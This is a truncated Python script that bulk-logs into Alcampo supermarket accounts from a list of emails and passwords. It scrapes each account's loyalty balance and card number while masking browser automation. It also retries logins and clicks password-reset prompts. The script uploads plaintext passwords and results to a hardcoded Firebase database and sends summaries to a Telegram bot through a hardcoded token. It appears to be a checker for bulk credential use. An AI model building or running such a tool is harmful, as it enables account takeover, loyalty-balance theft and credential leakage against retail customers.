import sys
import time
import re
import json
import argparse
import os
import html
import threading
import builtins
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed
import requests


try:
    from selenium import webdriver
    from selenium.webdriver.chrome.service import Service
    from selenium.webdriver.chrome.options import Options
    from selenium.webdriver.common.by import By
    from selenium.webdriver.common.keys import Keys
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from webdriver_manager.chrome import ChromeDriverManager
except ImportError:
    webdriver = None

sys.stdout.reconfigure(encoding='utf-8')
sys.stderr.reconfigure(encoding='utf-8')

ROOT = Path(__file__).resolve().parent
ACCOUNTS_FILE = ROOT / "accounts.json"
EXCEL_FILE = ROOT / "saldos_alcampo.xlsx"

# Lock for thread-safe file writing and printing
log_lock = threading.Lock()

# Global state for progress tracking
progress_state = {
    "total": 0,
    "processed": 0,
    "success": 0,
    "money": 0,
    "zero": 0,
    "error": 0,
    "total_balance": 0.0,
    "start_time": 0.0,
    "elapsed": 0.0,
    "eta": None,
    "threads": {}
}

# --- GLOBAL PRINT INTERCEPTION ---
original_print = builtins.print

def print_and_log(*args, **kwargs):
    """Intercepts print calls to write them to consola.log in real-time."""
    sep = kwargs.get('sep', ' ')
    end = kwargs.get('end', '\n')
    file = kwargs.get('file', None)
    
    # We only intercept stdout/stderr prints
    if file is None or file == sys.stdout or file == sys.stderr:
        msg = sep.join(str(arg) for arg in args)
        kwargs['flush'] = True  # Force auto-flushing to prevent buffering in logs
        with log_lock:
            original_print(*args, **kwargs)
            try:
                with open(ROOT / "consola.log", "a", encoding="utf-8") as f:
                    f.write(msg + end)
            except Exception:
                pass
    else:
        original_print(*args, **kwargs)

# Replace built-in print globally
builtins.print = print_and_log


# --- CIRCUIT BREAKER (SERVER DOWN / CLOUDFLARE GUARD) ---
class CircuitBreaker:
    """Interruptor de Seguridad: detecta caídas del servidor de Alcampo/Cloudflare
    y aborta la ejecución para no consumir minutos en GitHub Actions inutilmente."""
    def __init__(self, max_consecutive_failures=5, max_failure_ratio=0.40, min_processed_threshold=5):
        self.lock = threading.Lock()
        self.consecutive_server_errors = 0
        self.total_server_errors = 0
        self.total_processed = 0
        self.max_consecutive = max_consecutive_failures
        self.max_ratio = max_failure_ratio
        self.min_threshold = min_processed_threshold
        self.triggered = False
        self.trigger_reason = ""

    def is_server_down_error(self, status_code=None, page_source="", error_msg=""):
        combined = f"{page_source} {error_msg}".lower()
        if status_code and (500 <= status_code <= 599 or status_code in (520, 521, 522, 523, 524, 525, 526)):
            return True, f"HTTP Status {status_code}"

        cf_signatures = [
            "error 522", "error 524", "error 520", "error 502", "error 503", "error 504",
            "502 bad gateway", "503 service unavailable", "504 gateway time-out",
            "connection timed out", "host error", "cloudflare ray id", "origin unreachable"
        ]
        for sig in cf_signatures:
            if sig in combined:
                return True, f"Firma Cloudflare/Servidor: '{sig}'"

        maint_signatures = [
            "mantenimiento", "estamos realizando tareas de mantenimiento",
            "sitio en mantenimiento", "servidor no disponible", "web temporalmente fuera de servicio"
        ]
        for sig in maint_signatures:
            if sig in combined:
                return True, f"Banner Mantenimiento: '{sig}'"

        return False, ""

    def record_result(self, is_server_error, reason=""):
        with self.lock:
            self.total_processed += 1
            if is_server_error:
                self.consecutive_server_errors += 1
                self.total_server_errors += 1
            else:
                self.consecutive_server_errors = 0

            ratio = (self.total_server_errors / self.total_processed) if self.total_processed > 0 else 0.0

            if self.consecutive_server_errors >= self.max_consecutive:
                self.triggered = True
                self.trigger_reason = f"🚨 {self.consecutive_server_errors} errores consecutivos de servidor ({reason})"
            elif self.total_processed >= self.min_threshold and ratio > self.max_ratio:
                self.triggered = True
                self.trigger_reason = f"🚨 {ratio*100:.1f}% de errores de servidor en {self.total_processed} cuentas"

            return self.triggered, self.trigger_reason

circuit_breaker = CircuitBreaker(max_consecutive_failures=5, max_failure_ratio=0.40, min_processed_threshold=5)


def get_firebase_url():
    url = (os.environ.get("FIREBASE_DB_URL") or "").strip()
    if not url or url.lower() in ("none", "null", "***", "undefined") or not url.startswith("http"):
        return "https://monitor-alcampo-default-rtdb.europe-west1.firebasedatabase.app/"
    return url


def get_telegram_config():
    token = (os.environ.get("TELEGRAM_TOKEN") or "").strip()
    chat_id = (os.environ.get("TELEGRAM_CHAT_ID") or "").strip()
    
    # Check if they are valid, handling mask/null indicators from CI
    is_valid_token = bool(re.match(r"^\d+:[A-Za-z0-9_-]+$", token)) and token.lower() not in ("none", "null", "***", "undefined")
    
    is_valid_chat = False
    if chat_id and chat_id.lower() not in ("none", "null", "***", "undefined"):
        try:
            int(chat_id)
            is_valid_chat = True
        except ValueError:
            pass
            
    if not is_valid_token or not is_valid_chat:
        return "8041531688:AAHif8qa9wMZ1EAxU3MrftR-tCrEkQ2dfPU", -5049278431
        
    return token, int(chat_id)



# --- PROGRESS TRACKING FUNCTIONS ---
def init_progress(total_accounts):
    """Initializes the progress files before scraping starts."""
    global progress_state
    with log_lock:
        progress_state["total"] = total_accounts
        progress_state["processed"] = 0
        progress_state["success"] = 0
        progress_state["money"] = 0
        progress_state["zero"] = 0
        progress_state["error"] = 0
        progress_state["total_balance"] = 0.0
        progress_state["start_time"] = time.time()
        progress_state["elapsed"] = 0.0
        progress_state["eta"] = None
        progress_state["threads"] = {}

        # Reset consola.log and write initial progreso.json
        try:
            if os.path.exists(ROOT / "consola.log"):
                os.remove(ROOT / "consola.log")
        except Exception:
            pass

        try:
            with open(ROOT / "progreso.json", "w", encoding="utf-8") as f:
                json.dump(progress_state, f, indent=4)
        except Exception:
            pass

        # Asynchronously reset Firebase Realtime DB if URL is configured
        firebase_url = get_firebase_url()
        if firebase_url:
            try:
                def reset_firebase():
                    try:
                        url = firebase_url.strip()
                        prog_url = url.rstrip('/') + "/progress.json"
                        requests.put(prog_url, json=progress_state, timeout=5)
                        
                        logs_url = url.rstrip('/') + "/logs.json"
                        requests.put(logs_url, json="🚀 [SISTEMA] Iniciando Alcampo Scraper v2.0 (Optimizado)...\n", timeout=5)
                    except Exception:
                        pass
                threading.Thread(target=reset_firebase, daemon=True).start()
            except Exception:
                pass

results_lock = threading.Lock()
local_results = {}

def update_progress(thread_idx, email, status, saldo_str):
    """Thread-safely updates progress metrics, saves to progreso.json, and pushes deduplicated results to Firebase."""
    global progress_state, local_results
    
    saldo_val = limpiar_saldo(saldo_str)
    email_key = email.replace('.', '_').replace('@', '_').replace('$', '_').replace('#', '_').replace('[', '_').replace(']', '_')
    
    result_entry = {
        "email": email,
        "status": status,
        "saldo": saldo_str,
        "balance": saldo_val,
        "timestamp": time.time()
    }
    
    with log_lock:
        with results_lock:
            local_results[email_key] = result_entry
            progress_state["threads"][str(thread_idx)] = {
                "last_account": email,
                "last_status": status,
                "timestamp": time.time()
            }
            
        # Local deduplicated recalculation
        money_count = 0
        zero_count = 0
        error_count = 0
        total_bal = 0.0
        
        with results_lock:
            for k, item in local_results.items():
                st = item.get("status")
                bal = item.get("balance")
                if st == "success":
                    if bal is not None and isinstance(bal, (int, float)) and bal > 0:
                        money_count += 1
                        total_bal += float(bal)
                    else:
                        zero_count += 1
                elif st == "error":
                    error_count += 1
                    
        success_count = money_count + zero_count
        processed_count = success_count + error_count
        
        progress_state["processed"] = max(progress_state.get("processed", 0), processed_count)
        progress_state["success"] = success_count
        progress_state["money"] = money_count
        progress_state["zero"] = zero_count
        progress_state["error"] = error_count
        progress_state["total_balance"] = round(total_bal, 2)
        
        elapsed = time.time() - progress_state.get("start_time", time.time())
        progress_state["elapsed"] = elapsed
        
        if progress_state["processed"] > 0 and progress_state.get("total", 0) > 0:
            avg_time = elapsed / progress_state["processed"]
            remaining = max(0, progress_state["total"] - progress_state["processed"])
            progress_state["eta"] = remaining * avg_time
            
        try:
            with open(ROOT / "progreso.json", "w", encoding="utf-8") as f:
                json.dump(progress_state, f, indent=4)
        except Exception:
            pass

    firebase_url = get_firebase_url()
    if firebase_url:
        def push_to_firebase():
            try:
                url = firebase_url.strip().rstrip('/')
                # 1. Update individual result entry in /results/{email_key}
                firebase_session.put(f"{url}/results/{email_key}.json", json=result_entry, timeout=5)
                # 2. Update queue entry status
                firebase_session.patch(f"{url}/queue/{email_key}.json", json={"status": status, "saldo": saldo_str, "balance": saldo_val}, timeout=5)
                
                # 3. Fetch all /results.json from Firebase to merge across all parallel VMs & retry passes
                res = firebase_session.get(f"{url}/results.json", timeout=5)
                all_results = {}
                if res.ok and isinstance(res.json(), dict):
                    all_results = res.json()
                
                with results_lock:
                    for k, v in local_results.items():
                        all_results[k] = v
                
                fb_money = 0
                fb_zero = 0
                fb_error = 0
                fb_balance = 0.0
                
                for k, item in all_results.items():
                    if not isinstance(item, dict):
                        continue
                    st = item.get("status")
                    bal = item.get("balance")
                    if st == "success":
                        if bal is not None and isinstance(bal, (int, float)) and bal > 0:
                            fb_money += 1
                            fb_balance += float(bal)
                        else:
                            fb_zero += 1
                    elif st == "error":
                        fb_error += 1
                
                fb_success = fb_money + fb_zero
                fb_processed = fb_success + fb_error
                fb_total = max(progress_state.get("total", 0), fb_processed)
                
                prog_snap = {
                    "total": fb_total,
                    "processed": fb_processed,
                    "success": fb_success,
                    "money": fb_money,
                    "zero": fb_zero,
                    "error": fb_error,
                    "total_balance": round(fb_balance, 2),
                    "elapsed": round(time.time() - progress_state.get("start_time", time.time()), 1),
                    "threads": progress_state.get("threads", {}),
                    "timestamp": time.time()
                }
                
                with log_lock:
                    progress_state.update(prog_snap)
                    
                firebase_session.put(f"{url}/progress.json", json=prog_snap, timeout=5)
                
                # Push latest logs
                try:
                    log_path = ROOT / "consola.log"
                    if log_path.exists():
                        with open(log_path, "r", encoding="utf-8") as f:
                            lines = f.readlines()
                        filtered = [l for l in lines if not (l.strip().startswith('#') and '0x' in l)
                                    and 'Stacktrace:' not in l and '(Session info:' not in l and '<unknown>' not in l]
                        latest_logs = "".join(filtered[-100:])
                        firebase_session.put(f"{url}/logs.json", json=latest_logs, timeout=5)
                except Exception:
                    pass
            except Exception as e:
                pass
                
        threading.Thread(target=push_to_firebase, daemon=True).start()


# --- FIREBASE DYNAMIC WORK QUEUE ---
queue_lock = threading.Lock()
firebase_session = requests.Session()
fb_adapter = requests.adapters.HTTPAdapter(pool_connections=20, pool_maxsize=20)
firebase_session.mount("https://", fb_adapter)
firebase_session.mount("http://", fb_adapter)

def init_firebase_queue(accounts):
    """Initializes the shared work-stealing queue on Firebase Realtime DB."""
    firebase_url = get_firebase_url()
    if not firebase_url:
        return False
    try:
        url = firebase_url.strip().rstrip('/') + "/queue.json"
        queue_data = {}
        for acc in accounts:
            email_key = acc["email"].replace('.', '_').replace('@', '_').replace('$', '_').replace('#', '_').replace('[', '_').replace(']', '_')
            queue_data[email_key] = {
                "email": acc["email"],
                "password": acc["password"],
                "status": "pending",
                "claimed_by": None,
                "timestamp": time.time()
            }
        firebase_session.put(url, json=queue_data, timeout=8)
        print(f"📦 [FIREBASE QUEUE] Cola dinámica inicializada con {len(accounts)} cuentas en Firebase.")
        return True
    except Exception as e:
        print(f"⚠️ Error inicializando cola dinámica en Firebase: {e}")
        return False

def claim_account_from_queue(worker_id):
    """Atomically claims the next pending or stale (>60s) account from the shared Firebase queue 1-by-1."""
    firebase_url = get_firebase_url()
    if not firebase_url:
        return None
    
    with queue_lock:
        try:
            url = firebase_url.strip().rstrip('/') + "/queue.json"
            res = firebase_session.get(url, timeout=5)
            if not res.ok:
                return None
            queue_data = res.json()
            if not isinstance(queue_data, dict):
                return None

            now = time.time()
            # Phase 1: Try claiming a pending account
            for key, item in queue_data.items():
                if isinstance(item, dict) and item.get("status") == "pending":
                    claim_url = firebase_url.strip().rstrip('/') + f"/queue/{key}.json"
                    item["status"] = "in_progress"
                    item["claimed_by"] = str(worker_id)
                    item["claimed_at"] = now
                    item["timestamp"] = now
                    firebase_session.put(claim_url, json=item, timeout=5)
                    return {"email": item["email"], "password": item["password"]}

            # Phase 2: Stale claim recovery (work stealing for accounts in_progress > 60s)
            for key, item in queue_data.items():
                if isinstance(item, dict) and item.get("status") == "in_progress":
                    last_time = item.get("timestamp") or item.get("claimed_at") or 0
                    if now - last_time > 60:
                        print(f"🏴‍☠️ [WORK STEAL] Robando cuenta estancada {item.get('email')} de {item.get('claimed_by')} (>60s sin actividad).")
                        claim_url = firebase_url.strip().rstrip('/') + f"/queue/{key}.json"
                        item["status"] = "in_progress"
                        item["claimed_by"] = str(worker_id)
                        item["claimed_at"] = now
                        item["timestamp"] = now
                        firebase_session.put(claim_url, json=item, timeout=5)
                        return {"email": item["email"], "password": item["password"]}

            return None
        except Exception as e:
            print(f"Warning claiming account from queue: {e}")
            return None

def claim_accounts_from_queue(worker_id, count=1):
    """Wrapper for batch claiming compatibility."""
    acc = claim_account_from_queue(worker_id)
    return [acc] if acc else []


# Install ChromeDriver once globally
try:
    CHROME_DRIVER_PATH = ChromeDriverManager().install()
    print(f"ChromeDriver installed by webdriver_manager at: {CHROME_DRIVER_PATH}")
except Exception as e:
    print(f"Error installing ChromeDriver with webdriver_manager: {e}")
    CHROME_DRIVER_PATH = "/usr/bin/chromedriver"
    print(f"Falling back to system ChromeDriver at: {CHROME_DRIVER_PATH}")


def update_single_check_progress(email, status, message, percent, balance=None, card_number=None, error=None):
    firebase_url = get_firebase_url()
    if not firebase_url:
        return
    try:
        email_sanitized = email.replace('.', '_').replace('@', '_').replace('$', '_').replace('#', '_').replace('[', '_').replace(']', '_')
        check_id = os.environ.get("CHECK_ID")
        payload = {
            "email": email,
            "status": status,
            "progress_message": message,
            "progress_percent": percent,
            "balance": balance,
            "card_number": card_number,
            "error": error,
            "timestamp": time.time()
        }
        if check_id:
            payload["check_id"] = check_id
        url = firebase_url.strip().rstrip('/') + f"/single_check_result/{email_sanitized}.json"
        requests.put(url, json=payload, timeout=5)

    except Exception as e:
        print(f"Error actualizando progreso en Firebase: {e}")


def check_single_account(email, password, scrape_card=True, existing_card_number=None):
    """Logs in and checks the balance (and optionally card number) of a single account.
    If existing_card_number is provided, skips the card scraping entirely.
    Returns: {"status": "success"/"error", "balance": float/None, "card_number": str/None, "error": str/None}
    """
    driver = None
    try:
        update_single_check_progress(email, "running", "Iniciando...", 20)
        chrome_options = Options()
        chrome_options.add_argument("--headless=new")
        chrome_options.add_argument("--disable-gpu")
        chrome_options.add_argument("--no-sandbox")
        chrome_options.add_argument("--disable-dev-shm-usage")
        # Performance: smaller window, disable unnecessary features
        chrome_options.add_argument("--window-size=1024,768")
        chrome_options.add_argument("--disable-blink-features=AutomationControlled")
        chrome_options.add_argument("--disable-extensions")
        chrome_options.add_argument("--disable-plugins")
        chrome_options.add_argument("--disable-images")
        chrome_options.add_argument("--blink-settings=imagesEnabled=false")
        chrome_options.add_argument("--disable-javascript-harmony-shipping")
        chrome_options.add_argument("--memory-pressure-off")
        chrome_options.page_load_strategy = "eager"
        
        driver = webdriver.Chrome(
            service=Service(CHROME_DRIVER_PATH),
            options=chrome_options
        )
        driver.set_page_load_timeout(15)  # Reduced from 25s
        driver.implicitly_wait(0)  # Rely on explicit WebDriverWait only
        
        # 1. Login
        update_single_check_progress(email, "running", "Cargando...", 35)
        driver.get("https://www.compraonline.alcampo.es/login?destination=%2F")
        wait = WebDriverWait(driver, 15)
        
        try:
            accept_btn = wait.until(EC.element_to_be_clickable((By.XPATH, "//button[contains(text(), 'Aceptar cookies') or contains(text(), 'Aceptar')]")))
            accept_btn.click()
            # No sleep needed: wait for the form field to be ready instead
        except Exception:
            pass
            
        email_field = wait.until(EC.presence_of_element_located((By.ID, "uname1")))
        password_field = driver.find_element(By.ID, "pwd1")
        email_field.send_keys(email)
        password_field.send_keys(password)
        
        update_single_check_progress(email, "running", "Logueando...", 50)
        password_field.send_keys(Keys.ENTER)
        
        WebDriverWait(driver, 20).until(
            lambda d: "compraonline.alcampo.es" in d.current_url and "login" not in d.current_url
        )
        
        # 2. Get cookies & request settings/loyalty
        cookies = driver.get_cookies()
        user_agent = driver.execute_script("return navigator.userAgent;")
        
        session = requests.Session()
        for cookie in cookies:
            name = cookie['name']
            val = cookie['value']
            try:
                name.encode('latin-1')
            except UnicodeEncodeError:
                name = name.encode('utf-8').decode('latin-1')
            try:
                val.encode('latin-1')
            except UnicodeEncodeError:
                val = val.encode('utf-8').decode('latin-1')
            session.cookies.set(name, val)
            
        headers = {
            "User-Agent": user_agent,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3"
        }
        
        update_single_check_progress(email, "running", "Saldo...", 70)
        res = session.get("https://www.compraonline.alcampo.es/settings/loyalty", headers=headers, timeout=12)
        if res.status_code != 200:
            raise Exception(f"HTTP Error {res.status_code} fetching loyalty settings")
            
        # 3. Parse balance
        saldo_str = "No encontrado"
        match = re.search(r"Tu Saldo es\s*([\d,.]+)\s*€", res.text)
        if match:
            saldo_str = f"Tu Saldo es {match.group(1)} €"
        else:
            cleaned_text = re.sub(r'<[^>]+>', ' ', res.text)
            cleaned_text = ' '.join(cleaned_text.split())
            match_text = re.search(r"Tu Saldo es\s*([\d,.]+)\s*€", cleaned_text)
            if match_text:
                saldo_str = f"Tu Saldo es {match_text.group(1)} €"
            else:
                match_alt = re.search(r"Saldo\s*:\s*([\d,.]+)", cleaned_text, re.IGNORECASE)
                if match_alt:
                    saldo_str = f"Tu Saldo es {match_alt.group(1)} €"
                    
        balance = limpiar_saldo(saldo_str)
        if balance is None:
            raise Exception(f"No se pudo determinar el saldo. HTML: {saldo_str}")
            
        # 4. Optional: scrape card number
        # If an existing card number is passed in (from env or caller), reuse it directly
        card_number = existing_card_number if existing_card_number else None
        if scrape_card and not card_number:
            update_single_check_progress(email, "running", "Tarjeta...", 85)
            try:
                # Navigate driver to settings/loyalty page
                driver.get("https://www.compraonline.alcampo.es/settings/loyalty")
                # Wait for the "Mi cuenta Club Alcampo" button instead of blind sleep
                card_wait = WebDriverWait(driver, 10)
                
                # Accept cookies again if needed (quick check, no wait)
                try:
                    accept_btn = driver.find_element(By.XPATH, "//button[contains(text(), 'Aceptar cookies') or contains(text(), 'Aceptar')]")
                    accept_btn.click()
                except Exception:
                    pass
                
                # Find and click "Mi cuenta Club Alcampo"
                btn = card_wait.until(EC.element_to_be_clickable((By.XPATH, "//span[contains(text(), 'Mi cuenta Club Alcampo')]/.. | //a[contains(text(), 'Mi cuenta Club Alcampo')]")))
                main_handle = driver.current_window_handle
                btn.click()
                
                # Wait for new tab to open instead of fixed sleep
                WebDriverWait(driver, 8).until(lambda d: len(d.window_handles) > 1)
                
                all_handles = driver.window_handles
                portal_handle = None
                for handle in all_handles:
                    if handle != main_handle:
                        portal_handle = handle
                        break
                        
                if portal_handle:
                    driver.switch_to.window(portal_handle)
                    update_single_check_progress(email, "running", "Finalizando...", 95)
                    # Wait for page to load the card number (which happens asynchronously)
                    try:
                        WebDriverWait(driver, 12).until(
                            lambda d: re.search(r'\b\d{13}\b', d.page_source) or re.search(r'value="\?clif=(\d+)"', d.page_source)
                        )
                    except Exception:
                        pass  # Use whatever has loaded so far
                    portal_html = driver.page_source
                    
                    match_clif = re.search(r'value="\?clif=(\d+)"', portal_html)
                    if match_clif:
                        card_number = match_clif.group(1)
                    else:
                        match_13 = re.search(r'\b\d{13}\b', portal_html)
                        if match_13:
                            card_number = match_13.group(0)
            except Exception as e:
                # Log card scraping error but don't fail balance check
                print(f"Advertencia: No se pudo extraer número de tarjeta: {e}")
        elif card_number:
            print(f"✔ Reutilizando número de tarjeta existente: {card_number} (sin scraping)")
                
        return {
            "status": "success",
            "balance": balance,
            "card_number": card_number,
            "error": None
        }
    except Exception as e:
        return {
            "status": "error",
            "balance": None,
            "card_number": None,
            "error": str(e)
        }
    finally:
        if driver:
            try:
                driver.quit()
            except:
                pass


def parse_args():
    parser = argparse.ArgumentParser(description="Alcampo Account Balance Scraper (Optimized Matrix Ready)")
    parser.add_argument(
        "--send-telegram", 
        action="store_true", 
        default=True,
        help="Enables sending summary and excel file to Telegram (default: True)"
    )
    parser.add_argument(
        "--no-telegram",
        action="store_true",
        help="Disables sending summary and excel file to Telegram"
    )
    parser.add_argument(
        "--threads", 
        type=int, 
        default=6, 
        help="Number of concurrent threads (default: 6)"
    )
    parser.add_argument(
        "--limit", 
        type=int, 
        default=None, 
        help="Limit execution to first N accounts (for testing)"
    )
    parser.add_argument(
        "--start-index",
        type=int,
        default=None,
        help="Start index of accounts to process"
    )
    parser.add_argument(
        "--shard-id",
        type=int,
        default=None,
        help="Matrix shard ID (0..total_shards-1)"
    )
    parser.add_argument(
        "--total-shards",
        type=int,
        default=None,
        help="Total matrix shards"
    )
    parser.add_argument(
        "--input-file",
        type=str,
        default=None,
        help="Path to custom accounts JSON file"
    )
    parser.add_argument(
        "--output-file",
        type=str,
        default=None,
        help="Custom output Excel path"
    )
    parser.add_argument(
        "--use-queue",
        action="store_true",
        help="Use dynamic work-stealing queue via Firebase Realtime DB"
    )
    parser.add_argument(
        "--init-queue",
        action="store_true",
        help="Initialize the shared Firebase work queue with the target accounts list"
    )
    parser.add_argument(
        "--check-single",
        nargs=2,
        metavar=("EMAIL", "PASSWORD"),
        help="Check balance and card number of a single account and exit"
    )
    return parser.parse_args()


def enviar_telegram_texto(token, chat_id, mensaje):
    url = f"https://api.telegram.org/bot{token}/sendMessage"
    data = {"chat_id": chat_id, "text": mensaje, "parse_mode": "HTML"}
    try:
        response = requests.post(url, data=data)
        print(f"📡 Enviando a Telegram: {response.status_code} - {response.text}")
        response.raise_for_status()
    except Exception as e:
        print(f"❌ Error sending to Telegram: {e}")


def enviar_telegram_documento(token, chat_id, path, caption=""):
    url = f"https://api.telegram.org/bot{token}/sendDocument"
    try:
        with open(path, "rb") as file:
            data = {"chat_id": chat_id, "caption": caption}
            response = requests.post(url, data=data, files={"document": file})
            print(f"📁 Enviando documento a Telegram: {response.status_code} - {response.text}")
            response.raise_for_status()
    except Exception as e:
        print(f"❌ Error enviando documento a Telegram: {e}")


def procesar_bloque(accounts_chunk, thread_idx):
    resultados = []
    driver = None
    
    def init_driver():
        nonlocal driver
        if driver:
            try:
                driver.quit()
            except:
                pass
        chrome_options = Options()
        chrome_options.add_argument("--headless=new")
        chrome_options.add_argument("--disable-gpu")
        chrome_options.add_argument("--no-sandbox")
        chrome_options.add_argument("--disable-dev-shm-usage")
        chrome_options.add_argument("--blink-settings=imagesEnabled=false")
        chrome_options.page_load_strategy = "eager"
        chrome_options.add_argument("--disable-blink-features=AutomationControlled")
        
        driver = webdriver.Chrome(
            service=Service(CHROME_DRIVER_PATH),
            options=chrome_options
        )
        driver.set_page_load_timeout(20)
        driver.implicitly_wait(1)

    for idx, acc in enumerate(accounts_chunk):
        if circuit_breaker.triggered:
            print(f"[Hilo {thread_idx}] 🛑 Circuit Breaker activado previamente. Abortando {acc['email']}")
            break

        email = acc["email"]
        password = acc["password"]
        print(f"[Hilo {thread_idx}] → Procesando ({idx+1}/{len(accounts_chunk)}): {email}")
        
        intentos_max = 2
        saldo = "Error: Desconocido"
        
        for intento in range(1, intentos_max + 1):
            try:
                if not driver:
                    init_driver()
                
                # 1. Cargar login
                driver.get("https://www.compraonline.alcampo.es/login?destination=%2F")
                wait = WebDriverWait(driver, 10)
                email_field = wait.until(EC.presence_of_element_located((By.ID, "uname1")))
                password_field = driver.find_element(By.ID, "pwd1")
                
                # 2. Rellenar credenciales y enviar
                email_field.send_keys(email)
                password_field.send_keys(password)
                password_field.send_keys(Keys.ENTER)
                
                # 3. Dynamic polling & redirect detection
                start_p = time.time()
                is_logged_in = False
                while time.time() - start_p < 8.0:
                    curr_url = driver.current_url
                    if "compraonline.alcampo.es" in curr_url and "login" not in curr_url and "my.site.com" not in curr_url:
                        is_logged_in = True
                        break
                    reset_elements = driver.find_elements(By.ID, "btnPwReset")
                    if reset_elements:
                        break
                    try:
                        p_html = driver.page_source
                        if "Call Center" in p_html or "bloqueada" in p_html or "incorrectos" in p_html:
                            break
                    except Exception:
                        pass
                    time.sleep(0.3)

                # Check reset password button fallback
                reset_btns = driver.find_elements(By.ID, "btnPwReset")
                if reset_btns and not is_logged_in:
                    try:
                        driver.execute_script("arguments[0].click();", reset_btns[0])
                        time.sleep(1.0)
                        driver.get("https://www.compraonline.alcampo.es/login?destination=%2F")
                        wait_rel = WebDriverWait(driver, 6)
                        email_el = wait_rel.until(EC.presence_of_element_located((By.XPATH, "//input[@id='uname1' or @type='email']")))
                        pwd_el = driver.find_element(By.XPATH, "//input[@id='pwd1' or @type='password']")
                        email_el.send_keys(email)
                        pwd_el.send_keys(password)
                        pwd_el.send_keys(Keys.ENTER)
                        start_rel = time.time()
                        while time.time() - start_rel < 6.0:
                            if "compraonline.alcampo.es" in driver.current_url and "login" not in driver.current_url:
                                is_logged_in = True
                                break
                            time.sleep(0.3)
                    except Exception:
                        pass

                if not is_logged_in and ("login" in driver.current_url or "my.site.com" in driver.current_url or "authenticationError" in driver.current_url or "authentication" in driver.current_url):
                    # Check if cookies allow navigating directly despite authenticationError redirect
                    if "authenticationError" in driver.current_url or "authentication" in driver.current_url:
                        try:
                            driver.get("https://www.compraonline.alcampo.es/settings/loyalty")
                            time.sleep(1.2)
                            if "settings/loyalty" in driver.current_url and "login" not in driver.current_url and "authenticationError" not in driver.current_url:
                                is_logged_in = True
                        except Exception:
                            pass

                # If still not logged in AND authenticationError is detected -> RE-ATTEMPT LOGIN FORM IN SELENIUM
                curr_u = ""
                p_source = ""
                try:
                    curr_u = driver.current_url
                    p_source = driver.page_source
                except Exception:
                    pass

                if not is_logged_in and ("authenticationError" in curr_u or "authenticationError" in p_source or "authentication error" in p_source.lower()):
                    print(f"[Hilo {thread_idx}] 🔄 Redirección authenticationError en {email}. Re-intentando formulario de login...")
                    try:
                        driver.get("https://www.compraonline.alcampo.es/login?destination=%2F")
                        wait_re = WebDriverWait(driver, 6)
                        e_field = wait_re.until(EC.presence_of_element_located((By.ID, "uname1")))
                        p_field = driver.find_element(By.ID, "pwd1")
                        e_field.send_keys(email)
                        p_field.send_keys(password)
                        p_field.send_keys(Keys.ENTER)
                        
                        start_re = time.time()
                        while time.time() - start_re < 6.0:
                            c_url = driver.current_url
                            if "compraonline.alcampo.es" in c_url and "login" not in c_url and "my.site.com" not in c_url and "authenticationError" not in c_url:
                                is_logged_in = True
                                break
                            time.sleep(0.3)
                            
                        if not is_logged_in:
                            driver.get("https://www.compraonline.alcampo.es/settings/loyalty")
                            time.sleep(1.2)
                            if "settings/loyalty" in driver.current_url and "login" not in driver.current_url and "authenticationError" not in driver.current_url:
                                is_logged_in = True
                    except Exception:
                        pass

                if not is_logged_in:
                    page_html = p_source or ""
                    curr_url_check = curr_u or ""
                    try:
                        if not page_html:
                            page_html = driver.page_source
                        if not curr_url_check:
                            curr_url_check = driver.current_url
                    except Exception:
                        pass
                    if "Tu cuenta ha sido bloqueada" in page_html or "Call Center" in page_html:
                        saldo = "Error: Cuenta bloqueada (Call Center 913 687 857)"
                    elif "Usuario o contraseña incorrectos" in page_html or "Credenciales incorrectas" in page_html:
                        saldo = "Error: Credenciales incorrectas"
                    elif "authenticationError" in curr_url_check or "authenticationError" in page_html or "authentication error" in page_html.lower():
                        saldo = "Error: authenticationError"
                    else:
                        saldo = "Error: Bloqueo/Timeout"
                    print(f"[Hilo {thread_idx}] 🔴 {email} → {saldo}")
                    is_down, reason = circuit_breaker.is_server_down_error(page_source=page_html, error_msg=saldo)
                    triggered, trigger_reason = circuit_breaker.record_result(is_down, reason)
                    if triggered:
                        print(f"🚨 [CIRCUIT BREAKER DISPARADO] {trigger_reason}. Abortando hilo {thread_idx}.")
                        break
                    break
                    
                # 4. Obtener cookies de la sesión
                cookies = driver.get_cookies()
                user_agent = driver.execute_script("return navigator.userAgent;")
                
                # 5. Hacer petición HTTP con requests para el saldo
                session = requests.Session()
                for cookie in cookies:
                    name = cookie['name']
                    val = cookie['value']
                    try:
                        name.encode('latin-1')
                    except UnicodeEncodeError:
                        name = name.encode('utf-8').decode('latin-1')
                    try:
                        val.encode('latin-1')
                    except UnicodeEncodeError:
                        val = val.encode('utf-8').decode('latin-1')
                    session.cookies.set(name, val)
                    
                headers = {
                    "User-Agent": user_agent,
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                    "Accept-Language": "es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3"
                }
                
                res = session.get("https://www.compraonline.alcampo.es/settings/loyalty", headers=headers, timeout=12)
                if res.status_code != 200:
                    raise Exception(f"HTTP Error {res.status_code}")
                    
                # 6. Parsear saldo usando regex
                saldo = "No encontrado"
                match = re.search(r"Tu Saldo es\s*([\d,.]+)\s*€", res.text)
                if match:
                    saldo = f"Tu Saldo es {match.group(1)} €"
                else:
                    # Fallback: quitar tags y probar regex
                    cleaned_text = re.sub(r'<[^>]+>', ' ', res.text)
                    cleaned_text = ' '.join(cleaned_text.split())
                    match_text = re.search(r"Tu Saldo es\s*([\d,.]+)\s*€", cleaned_text)
                    if match_text:
                        saldo = f"Tu Saldo es {match_text.group(1)} €"
                    else:
                        match_alt = re.search(r"Saldo\s*:\s*([\d,.]+)", cleaned_text, re.IGNORECASE)
                        if match_alt:
                            saldo = f"Tu Saldo es {match_alt.group(1)} €"
                
                # Fallback Chrome directo si el HTTP request dio authenticationError o no encontró saldo
                if "Tu Saldo es" not in saldo and driver:
                    try:
                        driver.get("https://www.compraonline.alcampo.es/settings/loyalty")
                        time.sleep(1.2)
                        driver_html = driver.page_source
                        match_driver = re.search(r"Tu Saldo es\s*([\d,.]+)\s*€", driver_html)
                        if match_driver:
                            saldo = f"Tu Saldo es {match_driver.group(1)} €"
                        else:
